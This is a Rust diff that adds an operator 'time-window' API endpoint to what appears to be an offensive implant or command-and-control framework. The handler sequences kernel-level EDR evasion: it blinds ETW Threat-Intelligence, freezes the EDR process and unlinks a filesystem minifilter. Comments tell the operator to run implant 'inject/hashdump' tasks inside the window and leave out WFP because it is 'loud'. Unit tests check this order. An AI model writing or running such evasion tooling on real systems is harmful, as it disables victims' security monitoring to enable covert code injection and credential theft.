@@ -6,6 +6,7 @@
 
 use axum::{
     extract::{Query, State},
+    http::StatusCode,
     response::{IntoResponse, Response},
     Json,
 };
@@ -198,6 +199,132 @@ pub struct PidQ {
 pub struct NeutQ {
     pub pid: u32,
     pub method: Option<String>,
+}
+
+/// `POST /api/kernel/window` body. `pid` is the EDR process for the
+/// neutralize (freeze) step; required on `open` because that step is part of
+/// the default plan.
+#[derive(Deserialize)]
+pub struct WindowBody {
+    pub phase: String,
+    pub pid: Option<u32>,
+}
+
+/// Operator time-window phase. `open` is fail-closed; `close` is best-effort.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub(crate) enum WindowPhase {
+    Open,
+    Close,
+}
+
+/// Default T2 window kit order. WFP is intentionally absent (loud AppId filter).
+const WINDOW_OPEN_OPS: &[&str] = &["blind-etw", "neutralize", "detach-minifilter"];
+const WINDOW_CLOSE_OPS: &[&str] = &["detach-minifilter", "neutralize", "blind-etw"];
+
+/// Kit sequence for an operator time-window.
+///
+/// Open: ETW-TI blind → EDR neutralize (existing daemon `neutralize` op,
+/// method=`freeze` only — HVCI-safe user-mode path, never `kill`) →
+/// MiniFilter unlink. Close: reverse order.
+pub(crate) fn window_plan(phase: WindowPhase) -> &'static [&'static str] {
+    match phase {
+        WindowPhase::Open => WINDOW_OPEN_OPS,
+        WindowPhase::Close => WINDOW_CLOSE_OPS,
+    }
+}
+
+/// Daemon restore op for a window kit, if kernelsdk already has undo.
+///
+/// None of the default-window kits expose restore today:
+/// - `EtwTiKit` has `blind` / `is_blinded`, not unblind (do not invent a write of 1).
+/// - `CallbackKit::repurpose` / `EdrNeutralize` freeze do not snapshot originals.
+/// - `MiniFilterUnlinker::unlink_filter` self-loops the victim; no relink.
+/// Close reports `restored: false, reason: "no undo op"` rather than lying.
+pub(crate) fn window_undo_op(_op: &str) -> Option<&'static str> {
+    None
+}
+
+/// Classify a daemon JSON-line reply. Transport errors and `{"ok":false}` both
+/// fail the step — a kit that returned failure must not be treated as success.
+pub(crate) fn classify_kit_result(
+    result: &Result<serde_json::Value, String>,
+) -> Result<serde_json::Value, String> {
+    match result {
+        Err(e) => Err(e.clone()),
+        Ok(v) if v.get("ok").and_then(|x| x.as_bool()) == Some(true) => Ok(v.clone()),
+        Ok(v) => Err(v
+            .get("err")
+            .and_then(|x| x.as_str())
+            .unwrap_or("kit failed")
+            .to_string()),
+    }
+}
+
+/// One recorded open-window step (success or the fail-closed error).
+#[derive(Debug, Clone, PartialEq)]
+pub(crate) struct OpenStep {
+    pub step: &'static str,
+    pub ok: bool,
+    pub reply: Option<serde_json::Value>,
+    pub err: Option<String>,
+}
+
+/// Fail-closed fold of open-window kit results: stop at the first error and
+/// do not visit later pairs (later kits must not run pretending success).
+pub(crate) fn fold_open_results(
+    pairs: impl IntoIterator<Item = (&'static str, Result<serde_json::Value, String>)>,
+) -> Result<Vec<OpenStep>, (Vec<OpenStep>, &'static str, String)> {
+    let mut steps = Vec::new();
+    for (step, result) in pairs {
+        match classify_kit_result(&result) {
+            Ok(reply) => steps.push(OpenStep {
+                step,
+                ok: true,
+                reply: Some(reply),
+                err: None,
+            }),
+            Err(err) => {
+                steps.push(OpenStep {
+                    step,
+                    ok: false,
+                    reply: None,
+                    err: Some(err.clone()),
+                });
+                return Err((steps, step, err));
+            }
+        }
+    }
+    Ok(steps)
+}
+
+/// Best-effort close plan: per-step restore metadata. Steps with no undo op
+/// are reported honestly and are not dispatched to the daemon.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct CloseStep {
+    pub step: &'static str,
+    pub restored: bool,
+    pub reason: &'static str,
+    pub undo_op: Option<&'static str>,
+}
+
+pub(crate) fn fold_close_plan() -> Vec<CloseStep> {
+    window_plan(WindowPhase::Close)
+        .iter()
+        .map(|&step| match window_undo_op(step) {
+            Some(undo) => CloseStep {
+                step,
+                restored: false,
+                reason: "pending undo op",
+                undo_op: Some(undo),
+            },
+            None => CloseStep {
+                step,
+                restored: false,
+                reason: "no undo op",
+                undo_op: None,
+            },
+        })
+        .collect()
 }
 
 // ---- Handler dispatch helper ----
@@ -460,5 +587,290 @@ pub async fn detach_minifilter(
     match result {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
+    }
+}
+
+/// Dispatch one window kit through the existing daemon JSON op names.
+/// Neutralize is always `freeze` (existing route default) — never `kill`.
+async fn dispatch_window_step(
+    bridge: &KernelBridge,
+    step: &str,
+    pid: Option<u32>,
+) -> Result<serde_json::Value, String> {
+    match step {
+        "blind-etw" => bridge.send_op("blind-etw", None, None).await,
+        "neutralize" => {
+            let pid = pid.filter(|p| *p > 0).ok_or_else(|| {
+                "neutralize requires pid > 0 (EDR process for freeze)".to_string()
+            })?;
+            bridge
+                .send_op("neutralize", Some(pid), Some("freeze"))
+                .await
+        }
+        "detach-minifilter" => bridge.send_op("detach-minifilter", None, None).await,
+        other => Err(format!("unknown window step: {other}")),
+    }
+}
+
+fn open_steps_json(steps: &[OpenStep]) -> Vec<serde_json::Value> {
+    steps
+        .iter()
+        .map(|s| {
+            if s.ok {
+                serde_json::json!({"step": s.step, "ok": true, "reply": s.reply})
+            } else {
+                serde_json::json!({"step": s.step, "ok": false, "err": s.err})
+            }
+        })
+        .collect()
+}
+
+/// Operator time-window over existing kits (T2 first increment).
+///
+/// Implant tasks are NOT paused automatically; the operator must sequence
+/// inject/hashdump inside the open window, then `close`. WFP is not in the
+/// default window.
+pub async fn window(
+    State(st): State<std::sync::Arc<crate::AppState>>,
+    crate::AuthOp(op): crate::AuthOp,
+    Json(body): Json<WindowBody>,
+) -> Response {
+    let phase = match body.phase.as_str() {
+        "open" => WindowPhase::Open,
+        "close" => WindowPhase::Close,
+        _ => {
+            return (
+                StatusCode::BAD_REQUEST,
+                Json(serde_json::json!({
+                    "ok": false,
+                    "err": "phase must be open|close"
+                })),
+            )
+                .into_response();
+        }
+    };
+    let details = match body.pid {
+        Some(p) => format!("phase:{:?},pid:{p}", phase),
+        None => format!("phase:{:?}", phase),
+    };
+    let (bridge, op) = match kernel_dispatch(
+        &st,
+        op,
+        "kernel_window",
+        &details,
+        serde_json::json!({ "phase": body.phase, "pid": body.pid }),
+    )
+    .await
+    {
+        Ok(t) => t,
+        Err(r) => return r,
+    };
+
+    let (status, body_json, result_for_audit) = match phase {
+        WindowPhase::Open => {
+            let mut pairs = Vec::new();
+            for &step in window_plan(WindowPhase::Open) {
+                let result = dispatch_window_step(bridge, step, body.pid).await;
+                let stop = classify_kit_result(&result).is_err();
+                pairs.push((step, result));
+                if stop {
+                    break;
+                }
+            }
+            match fold_open_results(pairs) {
+                Ok(steps) => {
+                    let json = serde_json::json!({
+                        "ok": true,
+                        "phase": "open",
+                        "pid": body.pid,
+                        "steps": open_steps_json(&steps),
+                    });
+                    (StatusCode::OK, json.clone(), Ok(json))
+                }
+                Err((steps, failed_step, err)) => {
+                    let json = serde_json::json!({
+                        "ok": false,
+                        "phase": "open",
+                        "pid": body.pid,
+                        "failed_step": failed_step,
+                        "err": err,
+                        "steps": open_steps_json(&steps),
+                    });
+                    (StatusCode::BAD_GATEWAY, json, Err(err))
+                }
+            }
+        }
+        WindowPhase::Close => {
+            // Best-effort reverse. Kits without a kernelsdk undo are not
+            // dispatched (do not re-run detach/blind/freeze as "restore").
+            let mut steps = Vec::new();
+            let mut any_restored = false;
+            for action in fold_close_plan() {
+                if let Some(undo) = action.undo_op {
+                    match dispatch_window_step(bridge, undo, body.pid).await {
+                        Ok(reply) if classify_kit_result(&Ok(reply.clone())).is_ok() => {
+                            any_restored = true;
+                            steps.push(serde_json::json!({
+                                "step": action.step,
+                                "restored": true,
+                                "reply": reply,
+                            }));
+                        }
+                        Ok(reply) => {
+                            let err = classify_kit_result(&Ok(reply))
+                                .err()
+                                .unwrap_or_else(|| "kit failed".into());
+                            steps.push(serde_json::json!({
+                                "step": action.step,
+                                "restored": false,
+                                "reason": err,
+                            }));
+                        }
+                        Err(e) => {
+                            steps.push(serde_json::json!({
+                                "step": action.step,
+                                "restored": false,
+                                "reason": e,
+                            }));
+                        }
+                    }
+                } else {
+                    steps.push(serde_json::json!({
+                        "step": action.step,
+                        "restored": false,
+                        "reason": action.reason,
+                    }));
+                }
+            }
+            let json = serde_json::json!({
+                "ok": any_restored,
+                "phase": "close",
+                "best_effort": true,
+                "steps": steps,
+            });
+            // Close never lies `ok: true` when nothing was restored.
+            (StatusCode::OK, json.clone(), Ok(json))
+        }
+    };
+
+    if let Some(audit) = &st.audit {
+        audit_kernel_outcome(
+            audit,
+            "kernel_window",
+            &op.name,
+            &details,
+            serde_json::json!({ "phase": body.phase, "pid": body.pid }),
+            &result_for_audit,
+        );
+    }
+    (status, Json(body_json)).into_response()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn window_plan_open_order_excludes_wfp() {
+        let plan = window_plan(WindowPhase::Open);
+        assert_eq!(plan, &["blind-etw", "neutralize", "detach-minifilter"][..]);
+        assert!(
+            !plan.iter().any(|op| op.contains("wfp")),
+            "WFP is loud (AppId filter) and must not be in the default window"
+        );
+        assert!(plan.iter().all(|op| window_undo_op(op).is_none()));
+    }
+
+    #[test]
+    fn window_plan_close_is_reverse_of_open() {
+        let open = window_plan(WindowPhase::Open);
+        let close = window_plan(WindowPhase::Close);
+        let rev: Vec<_> = open.iter().rev().copied().collect();
+        assert_eq!(close, rev.as_slice());
+    }
+
+    #[test]
+    fn fold_open_stops_on_first_error_and_ignores_later_kits() {
+        struct FailClosedIter {
+            items: Vec<(&'static str, Result<serde_json::Value, String>)>,
+            i: usize,
+            panic_at: usize,
+        }
+        impl Iterator for FailClosedIter {
+            type Item = (&'static str, Result<serde_json::Value, String>);
+            fn next(&mut self) -> Option<Self::Item> {
+                assert!(
+                    self.i < self.panic_at,
+                    "fold continued past fail-closed into later kits"
+                );
+                let item = self.items.get(self.i).cloned();
+                self.i += 1;
+                item
+            }
+        }
+
+        let iter = FailClosedIter {
+            items: vec![
+                ("blind-etw", Ok(serde_json::json!({"ok": true}))),
+                ("neutralize", Err("boom".into())),
+                ("detach-minifilter", Ok(serde_json::json!({"ok": true}))),
+            ],
+            i: 0,
+            // Third item must never be pulled: panic_at = 3 means i=0,1,2 are
+            // allowed; after the error the fold must return without pulling i=2.
+            panic_at: 2,
+        };
+        let err = fold_open_results(iter).expect_err("second step must fail-close");
+        assert_eq!(err.1, "neutralize");
+        assert_eq!(err.2, "boom");
+        assert_eq!(err.0.len(), 2);
+        assert!(err.0[0].ok);
+        assert!(!err.0[1].ok);
+    }
+
+    #[test]
+    fn fold_open_treats_daemon_ok_false_as_error() {
+        let pairs = vec![
+            (
+                "blind-etw",
+                Ok(serde_json::json!({"ok": false, "err": "no kit"})),
+            ),
+            ("neutralize", Ok(serde_json::json!({"ok": true}))),
+        ];
+        let err = fold_open_results(pairs).expect_err("ok:false is a step failure");
+        assert_eq!(err.1, "blind-etw");
+        assert_eq!(err.2, "no kit");
+        assert_eq!(err.0.len(), 1);
+    }
+
+    #[test]
+    fn fold_open_all_ok() {
+        let pairs = window_plan(WindowPhase::Open)
+            .iter()
+            .map(|&step| (step, Ok(serde_json::json!({"ok": true}))));
+        let steps = fold_open_results(pairs).expect("all kits ok");
+        assert_eq!(steps.len(), 3);
+        assert!(steps.iter().all(|s| s.ok));
+    }
+
+    #[test]
+    fn fold_close_reports_no_undo_rather_than_ok_true() {
+        let close = fold_close_plan();
+        assert_eq!(close.len(), 3);
+        assert!(close.iter().all(|s| !s.restored));
+        assert!(close.iter().all(|s| s.reason == "no undo op"));
+        assert!(close.iter().all(|s| s.undo_op.is_none()));
+        assert_eq!(close[0].step, "detach-minifilter");
+        assert_eq!(close[1].step, "neutralize");
+        assert_eq!(close[2].step, "blind-etw");
+    }
+
+    #[test]
+    fn classify_kit_result_requires_ok_true() {
+        assert!(classify_kit_result(&Ok(serde_json::json!({"ok": true}))).is_ok());
+        assert!(classify_kit_result(&Ok(serde_json::json!({"ok": true, "x": 1}))).is_ok());
+        assert!(classify_kit_result(&Ok(serde_json::json!({"ok": false}))).is_err());
+        assert!(classify_kit_result(&Ok(serde_json::json!({}))).is_err());
+        assert!(classify_kit_result(&Err("transport".into())).is_err());
     }
 }
